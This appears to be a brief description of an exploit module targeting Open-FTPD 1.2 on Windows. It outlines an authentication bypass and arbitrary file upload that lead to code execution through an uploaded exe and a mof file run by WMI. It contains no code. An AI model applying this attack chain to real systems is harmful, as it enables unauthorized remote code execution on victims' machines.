Exploit Windows PC using Open-FTPD 1.2 Arbitrary File Upload

This module exploits multiple vulnerabilities found in Open Compact FTP server. The software contains authentication bypass vulnerability and a arbitrary file upload vulnerability that allows a remote attacker to write arbitrary files to the file system as long as there is at least one user who has permission. Code execution can be achieved by first uploading the payload to the remote machine as an exe file, and then upload another mof file, which enables WMI (Management Instrumentation service) to execute the uploaded payload. Please note that this module currently only works for Windows before Vista.
